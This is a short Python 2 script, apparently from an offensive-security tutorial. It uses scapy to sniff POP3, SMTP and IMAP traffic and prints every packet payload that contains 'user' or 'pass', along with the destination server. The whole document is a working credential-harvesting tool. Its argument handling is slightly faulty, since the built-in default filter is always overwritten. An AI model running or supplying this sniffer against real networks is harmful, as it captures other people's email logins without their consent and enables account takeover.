from scapy.all import *
import sys


try:
    filter1 = "tcp port 110 or tcp port 25 or tcp port 143"
    filter1 = sys.argv[1]
except:
    print "Usage: ['tcp port' port 'or tcp port ' port]"
    

def packet_callback(packet):

    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s " % packet[TCP].payload

sniff(filter=filter1, prn=packet_callback, store=0)

